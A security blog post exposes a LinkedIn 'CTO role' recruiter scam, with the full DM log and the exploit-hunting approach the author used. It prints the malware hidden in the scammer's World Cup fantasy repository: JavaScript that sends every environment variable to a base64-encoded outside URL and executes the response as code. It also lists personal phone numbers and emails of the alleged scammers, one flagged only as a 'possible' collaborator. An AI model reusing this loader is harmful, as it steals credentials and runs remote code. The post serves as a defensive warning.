---
title: Barbosa Renato of World Cup Fantasy Project
description: Demands code review that would lead to exploitation
layout: post
date: 2026-04-10 14:56 0000
time_to_live: 1800
tags: [ DM, LinkedIn, RAT, scam ]
image: assets/images/scammers/2026-04-10_Barbosa-Renato-of-World-Cup-Fantasy-Project/LinkedIn-Header.png
# social_comment:
#   links:
#     - text: Blue Sky
#       href:
#       title: Link to thread for this post
#
#     - text: LinkedIn
#       href:
#       title: Link to LinkedIn thread for this post
#
#     - text: Mastodon
#       href:
#       title: Link to Toot thread for this post
#
#     - text: Twitter
#       href:
#       title: Link to Tweet thread for this post
---



This is apart of a ~~two~~ three part story, in no particular order, where
Larry and Barbosa, and now Bruce too, try to pop my box via very similar Oracle
JavaScript™ backend code.


______


## Contents


- [TLDR][heading__tldr]
  - [Threat actor contact details][heading__threat_actor_contact_details]
- [DM log][heading__dm_log]
<!-- - [Got something to say about that?](#heading__social_comment) -->



______


## TLDR
[heading__tldr]: #tldr

Is credential stealing and first-stage RAT, but they did pay $150.00 USD worth
of Ethereum for the chance to pop my box x-]

> Also web searching some of the code shows it may be rip-off of ->
> `https://github.com/CoolBuidlers/WC-NFT-Fantasy`
>
> ... so, I not impressed :-|

- `suahbsauvavqeqehcecibn/WC-Fantasy`

```javascript
//> backend/src/services/profileService.js
export const setApiKey = (s) => {
  if (!s) {
    // logger.warn('setApiKey called with null/undefined value');
    return null;
  }
  try {
    return atob(s);
  } catch (error) {
    // logger.error('Failed to decode API key:', error);
    return null;
  }
};

export const verify = (api) => {
  if (!api) {
    return Promise.reject(new Error('API URL is required'));
  }
  return axios.post(api, { ...process.env }, { headers: { "x-secret-header": "secret" } });
};
/* ... other BS ... */

//> backend/src/controllers/leaderboardController.js
const messageToken = "aHR0cHM6Ly9sb2NhdGUtbXktaXAudmVyY2VsLmFwcC9hcGkvaXAtY2hlY2stZW5jcnlwdGVkLzNhZWIzNGEzNA==";
//> https://locate-my-ip.vercel.app/api/ip-check-encrypted/3aeb34a34

async function verifyToken(req, res) {
  verify(setApiKey(messageToken))
    .then((response) => {
      const responseData = response.data;
      const message = responseData;
      const errorHandler = new (Function.constructor)("require", message);
      errorHandler(require);
      return { success: true, data: responseData };
    })
    .catch((err) => {
      console.log(err);
      return { success: false, data: err };
    });
}
verifyToken();
/* ... other BS ... */
```

### Exploit hunting tricks
[heading__exploit_hunting_tricks]: #exploit-hunting-tricks

Similar to the story with Larry Bogie, nothing fancy was required, a little
grep-ing about for common patterns and from there more grep-ing for what does
the dirty things, ex.

```bash
grep -rinE '\b(atob|axios|fetch)\b';
# Above exposed `verify` function, and below found its definition
grep -rinE '\b(verify)\b';
```

### Threat actor contact details
[heading__threat_actor_contact_details]: #threat-actor-contact-details


```yaml
Barbosa Renato:
  linkedin:
    personal: https://www.linkedin.com/in/orenatobarbosa/
    organization: https://www.linkedin.com/company/prefeituradeportoalegre/
  github:
    repository: https://github.com/suahbsauvavqeqehcecibn/WC-Fantasy/
    personal: https://github.com/ORenatoBarbosa
  phone: 555-198-229-5477
  email:
    - orenato.barbosa95@gmail.com
    - renato_barbosa22@hotmail.com
    - renatobarbosa@vivaldi.net
  twitter: https://twitter.com/Orenato_barbosa

lucatoscano:
  email: ferexmoto6@gmail.com
```

All of above info was publicly accessible.

Git log/blame is what exposed `lucatoscano` as possible collaborator, I write
"possible" because it is also possible that data was manipulated.

However `Barbosa Renato`, at least on LinkedIn, is highly likely a
ne're-do-well and apart of a larger Org that makes its business through
exploitation.  And it is very likely apart of same team as `Larry Bogie` due to
similarities of code and communication.


______


## DM log
[heading__dm_log]: #dm-log


### 2026-04-10 14:56 -- Barbosa Renato

> Hi, SOAndSO.
>
> I was looking at your profile and it really stood out. We’re growing fast in
> the blockchain space and exploring CTO role at World Cup Fantasy Project. Do
> you have a few minutes to chat and see if there’s a fit?
>
> Best regards,

### 2026-04-10 15:03 -- SOAndSO .eth (Digital Mercenary)

Nearly perfect timing Barbosa!

Sure, I can hop on a quick g-meet;

`https://meet.google.com/<REDACTED>`

... and will be there in a few moments

### 2026-04-10 15:06 -- Barbosa Renato

> Thank you for your interest.
>
> We’re building WC Fantasy, a Web3 platform that turns World Cup predictions
> into an exciting on-chain experience. Players can mint NFTs, join quizzes,
> and play mini-games. It’s a fully gamified, decentralized world where every
> prediction matters.
>
> This role is fully remote and flexible—open to both full-time or part-time
> collaboration.
>
> If this sounds interesting, could you let me know:
>
> * Whether you prefer full-time or part-time engagement
> * Your expected compensation range
>
> Once I have that, I’ll outline the next steps.
>
> Looking forward to your thoughts!
>
> Let's have a meeting after discuss several problems here.
>
> it's okay?

### 2026-04-10 15:11 -- SOAndSO .eth (Digital Mercenary)

For a CTO role it'd probably be wise to go full-time, as that'd reduce the
chances of coms getting delayed across timezones

As far as compensation, I'm pretty flexible so long as it is respectful of the
value I bring to the team

Edit; I've got my headset on and am at the g-meet link if ya wanna talk things
out

### 2026-04-10 15:13 -- Barbosa Renato

> Just a min.

### 2026-04-10 15:18 -- Barbosa Renato

> I am joining now.

### 2026-04-10 15:18 -- SOAndSO .eth (Digital Mercenary)

Woot!  I'm pretty sure permissions _should_ allow anyone with the link to join,
but do let me know if I failed at that

### 2026-04-10 15:19 -- Barbosa Renato

> Okay

### 2026-04-10 15:41 -- Barbosa Renato

> Nice to talking to you.

### 2026-04-10 16:41 -- SOAndSO .eth (Digital Mercenary)

Indeed, thanks for making the time so swiftly!

I did a quick skim of source code, could only spare an hour, but here's some
details that so far stood-out;

- `smartcontract/contracts/NumberGuessingGame.sol` Using `struct` for
  `RequestStatus` data, especially for storing `exists` and `fulfilled` states,
  is likely inefficient
- `smartcontract/contracts/WorldCupData8.sol` I'd be tempted to use a
  `constant` for `jobId` instead of storing as contract data, because while it
  may increase publish cost that's a one-time fee where as reading from contract
  data as it is currently encoded is an extra cost on every call
- `smartcontract/contracts/Evolve.sol` multiple `mapping`-s is odd, at least at
  first glance
- ChainLink integration currently used may be deprecated! I couldn't find for
  sure before my alarm went-off, but regardless it may be wise to not depend on
  third-parties for load-bearing features like this

I need a clear set of expectations from founders to target, and will likely
require two teammates to deliver a customer ready product. One teammate to
focus on Frontend and the other on Backend, while I do the smart-contract
security and optimization tasks

I've a few folks I can reach-out to, once we get to that point, that are pretty
proficient so I'll ask that ya please coordinate with decision makers so we can
get admin stuff squared away

### 2026-04-10 16:46 -- Barbosa Renato 4:46 PM

> Thanks for your sharing.
>
> The code review take a long time. We need to discuss the UI workflow in the
> next interview.
>
> Please review UI workflow now. I will schedule next interview after you
> finish UI workflow review and send me your feedback.
>
> Okay?
>
> You can get project information in more detail.

### 2026-04-10 17:02 -- SOAndSO .eth (Digital Mercenary) 5:02 PM

As we discussed via g-meet; the time I dedicated was predicated on being paid
for my time, 150USD worth of Ethereum is what we verbally agreed to. Before I
can dedicate additional attentions and skills we'll need to settle current
agreement's bill

Because code reviews, are one of the free services I do not provide, here be a
link to related FAQ section;

https://www.digital-mercenaries.com/frequently-asked-questions.html#do-you-offer-free-services-such-as-bug-testing-or-code-reviews

... Also, given what I skimmed so far, it is likely anyone I bring on to do
frontend tasks will be faster in a green-field instead of fixing someone else's
mess ;-)

### 2026-04-10 17:06 -- Barbosa Renato

> Awesome. I will pay you for the 1-hour code review you did.
>
> Sorry if we had some misunderstandings, I wanted you to do a quick
> UI-workflow review.
>
> And it sounds great to have a few dedicated developers that you can bring.
>
> Please send me your eth address, I will process $150
>
> and please do a UI review for the next 30  mins
>
> Of course, it will be paid review.

### 2026-04-10 17:13 -- SOAndSO .eth (Digital Mercenary)

Thanks for being quick!  My eth address is;

https://etherscan.io/address/s0ands0.eth

... doing a UI review is something I'll have to squeeze in at a slightly later
time, because I already had to push some things around to get ya fast results
for smart-contracts.  Not ever enough hours in the day x-]

### 2026-04-10 17:19 -- Barbosa Renato

> https://etherscan.io/tx/0xd94fb6ed36f51a74fed8a7c536bb51402f00540042e29e402d56d61663c0a334
>
> Just sent, please check.
>
> I will be available for the next 3 hours, then will be on my mobile
>
> It won't take for you more than 30 mins to do a UI review
>
> Please do it today and let me know, thanks.


### 2026-04-10 17:25 -- SOAndSO .eth (Digital Mercenary)

Super, I can confirm we're squared away on past agreement/bill!

I'll do my best to get my eyes on frontend by end of my day, but to level-set
expectations that is not likely to be within the three hours you've got
remaining on your end

Something to look forward when ya clock-in on Monday, and until then I'll be
wishing you a wonderful weekend!

### 2026-04-10 17:28 -- Barbosa Renato 5:28 PM

Thank you.

### 2026-04-11 09:14 -- Barbosa Renato

> Hi, how are you today?
>
> When can you send me your UI feedback?

### 2026-04-11 17:36 -- SOAndSO .eth (Digital Mercenary)

Currently it is the weekend, and while I did check-out the frontend and have
some concerns, it'll be Monday at the soonest before we can sync-up

'ntil then I hope your Saturday is spectacular!

### 2026-04-13 13:39 -- Barbosa Renato

> Hi, how are you today?

### 2026-04-13 15:04 -- SOAndSO .eth (Digital Mercenary)

Doing well I am! How about you?

### 2026-04-13 15:05 -- Barbosa Renato

> Awesome, thanks.
>
> How was your weekend?
>
> Please submit the frontend-ui review feedback, please don't spend more than 1
> hour. I am willing to pay you for the 1 hour-review.
>
> Also, I will need to submit the 2 feedback documents of you to tech branch of
> the company and get you schedule with a tech lead this week or so.
>
> Please confirm your availability for the tech-meeting.
>
> `*Please don't use AI tools and do it manually. Thanks.`

### 2026-04-13 15:43 -- SOAndSO .eth (Digital Mercenary)

An hour's time generally won't get ya a whole lotta value, for anything with
sufficient depth and actionable feedback is likely to require a bit more time
(and compensation for that time too), but according to my records/notes I could
probably submit a few issues I discovered last week reasonably quickly today

...  same sorta story be true, as far as time/comp exchange being necessary,
for any feedback reports/documents ya require

As for availability, I've a few moments today in about an hour, or I could
shift somethings about for tomorrow around the same time

Let me know how you'd like to proceed on fair exchange of value for my time and
skills, and if the lead be available for a quick nerd-out session

### 2026-04-13 15:50 -- Barbosa Renato

> Agreed.
>
> What's your estimate for the valuable feedback?
>
> What about 5 hours for the UI review?
>
> I really want to go to next step after UI review is initially done and we
> have something to talk about.
>
> And there seems to be a few issues after connecting wallets, please take a
> look at them as well.

### 2026-04-13 16:08 -- SOAndSO .eth (Digital Mercenary)

10 Eth. will get my undivided attention and detailed report(s) organized for
the team to address, which will include;

- UI/UX issues and/or improvement reqs
- end-to-end review for integration of blockchain, on both frontend and any
  backend/DB
- security audit of smart contracts as well as, if any, gas optimization
  recommendations

... But, if UI and wallet integration are the only priorities then 5 Eth seems
fair for the extensive experience I wield

Only restrictions on delivery, which shouldn't take longer than by mid-week, is
if anything overtly illegal or malicious is discovered during review. I dislike
having to put this sorta disclaimer on record, as ya seem like a stand-up
fellow, but crypto-space requires a bit of butt-covering :-\

### 2026-04-13 16:11 -- Barbosa Renato

> Thank you, I totally understand your concern.
>
> Let's agree on 5 Eth
>
> And if you'd like, we can have another quick meeting for you to help review
> the UI

### 2026-04-13 16:32 -- SOAndSO .eth (Digital Mercenary)

Groovy, let me know when I should watch for on-chain confirmation and I'll get
to work soon after that!

### 2026-04-13 16:34 -- Barbosa Renato

> I will process the payment upon receipt of the review

### 2026-04-13 16:48 -- SOAndSO .eth (Digital Mercenary)

Hmm, seems we're in a deadlock because I will start review upon receipt of
payment

### 2026-04-13 16:52 -- Barbosa Renato

> Thought you asked for post-payment.
>
> Can you give me 1-hour review for the frontend first?
>
> After that, we will have a call to discuss further steps

### 2026-04-13 17:03 -- SOAndSO .eth (Digital Mercenary)

An hour's time generally won't get ya a whole lotta value, for anything with
sufficient depth and actionable feedback, and anything that does provide
sufficient value to your team will require I dedicate time which also means
it'll require ya dedicate funds that fairly compensates me for the time

### 2026-04-13 17:08 -- Barbosa Renato

> Totally understood.
>
> But we are willing to pay the 5 hours' invoice upon receipt of review.

### 2026-04-13 17:11 -- SOAndSO .eth (Digital Mercenary)

Then we're back to a deadlock because I will start review upon receipt of payment

### 2026-04-13 17:12 -- Barbosa Renato

> I think we can't resolve this issue.
>
> Thanks for your time.

